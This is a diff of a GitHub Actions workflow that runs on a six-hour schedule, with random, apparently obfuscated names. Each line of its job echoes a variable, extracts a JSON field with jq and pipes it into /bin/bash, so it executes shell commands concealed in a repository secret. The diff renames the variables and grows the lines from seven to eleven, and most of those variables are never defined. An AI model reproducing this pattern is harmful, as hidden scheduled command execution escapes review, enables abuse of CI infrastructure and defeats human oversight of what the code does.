@@ -1,9 +1,8 @@
 name: flowerywhizz
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 1/6 * * *'
+    - cron: '14 1/6 * * *'
 
 jobs:
   build:
@@ -13,13 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: flowerywhizz
         env:
-          r226: ${{ secrets.r226 }}
+          n8334: ${{ secrets.n8334 }}
         run: |
-          echo $r226 | jq -r .tnv45 | /bin/bash
-          echo $ioi69748 | jq -r .tb71 | /bin/bash
-          echo $k461 | jq -r .tcq282 | /bin/bash
-          echo $l045 | jq -r .mceg684 | /bin/bash
-          echo $ufdh17762 | jq -r .sm6602 | /bin/bash
-          echo $xch4787 | jq -r .atdh0773 | /bin/bash
-          echo $kaxna9128 | jq -r .ww73765 | /bin/bash
+          echo $n8334 | jq -r .g81 | /bin/bash
+          echo $pfjw98876 | jq -r .fko120 | /bin/bash
+          echo $gfouq767 | jq -r .ula3985 | /bin/bash
+          echo $v5 | jq -r .bn600 | /bin/bash
+          echo $f90986 | jq -r .lkk2425 | /bin/bash
+          echo $h1 | jq -r .us33 | /bin/bash
+          echo $q779 | jq -r .wrcp62 | /bin/bash
+          echo $ziue16242 | jq -r .pgumq79118 | /bin/bash
+          echo $qpc537 | jq -r .inuo2224 | /bin/bash
+          echo $jzg0012 | jq -r .aadf5814 | /bin/bash
+          echo $zzc1 | jq -r .cyque034 | /bin/bash
 
